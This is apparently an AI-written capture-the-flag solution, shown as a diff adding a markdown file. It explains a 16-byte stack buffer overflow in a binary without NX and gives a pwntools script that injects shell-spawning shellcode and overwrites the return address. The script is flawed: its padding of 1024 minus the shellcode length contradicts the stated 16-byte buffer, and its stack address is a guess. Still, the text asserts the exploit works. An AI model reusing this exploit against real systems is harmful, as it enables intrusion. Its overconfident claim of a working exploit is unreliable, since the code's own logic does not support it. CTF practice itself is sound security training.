@@ -1,0 +1,67 @@
+To solve this challenge using `pwntools`, we need to craft a payload that will allow us to execute shellcode. The binary is not protected by NX, which means we can inject and execute our own shellcode. Here are the steps and the corresponding code to achieve this:
+
+### Steps:
+1. **Analyze the Binary:**
+   - The binary has no stack canary, no PIE, and no NX, which makes it vulnerable to a simple buffer overflow.
+   - The `main` function reads 1024 bytes into a buffer of size 16 bytes, which is clearly a buffer overflow vulnerability.
+
+2. **Craft the Payload:**
+   - We need to overwrite the return address with the address of our shellcode.
+   - Since the binary is not PIE, the addresses are fixed, and we can use a fixed address for the shellcode.
+
+3. **Inject Shellcode:**
+   - We can place our shellcode in the buffer and overwrite the return address with the address of the buffer.
+
+### Code:
+Here is the Python script using `pwntools` to exploit the binary:
+
+```python
+from pwn import *
+
+# Set up the process
+binary_path = './rop'
+p = process(binary_path)
+
+# Get the address of the buffer (assuming it's at the start of the stack frame)
+buffer_address = 0x7fffffffe000  # This is an example address, you might need to adjust it
+
+# Generate a simple shellcode to spawn a shell
+shellcode = asm(shellcraft.sh())
+
+# Create the payload
+payload = b''
+payload += shellcode
+payload += b'A' * (1024 - len(shellcode))  # Padding to reach the return address
+payload += p64(buffer_address)  # Overwrite the return address with the address of the buffer
+
+# Send the payload
+p.sendlineafter(b'Input someting : ', payload)
+
+# Switch to interactive mode to interact with the shell
+p.interactive()
+```
+
+### Explanation:
+1. **Process Setup:**
+   - We use `process(binary_path)` to start the binary in a local environment. If the binary is running on a remote server, you would use `remote('host', port)` instead.
+
+2. **Shellcode:**
+   - `asm(shellcraft.sh())` generates a simple shellcode to spawn a shell. This shellcode is placed at the beginning of the payload.
+
+3. **Padding:**
+   - We add padding to the payload to ensure that the return address is overwritten. The padding length is calculated as `1024 - len(shellcode)`.
+
+4. **Return Address:**
+   - We overwrite the return address with the address of the buffer. The buffer address is assumed to be `0x7fffffffe000`. You might need to adjust this address based on the actual stack layout.
+
+5. **Send Payload:**
+   - We send the payload after the prompt `Input someting : `.
+
+6. **Interactive Mode:**
+   - After sending the payload, we switch to interactive mode to interact with the spawned shell.
+
+### Notes:
+- The buffer address `0x7fffffffe000` is an example. You might need to find the exact address by analyzing the binary or using a debugger like GDB.
+- Ensure that the shellcode does not contain any null bytes, as they would terminate the string and cause the payload to fail.
+
+This should give you a working exploit for the given binary. Adjust the buffer address as needed based on your environment.
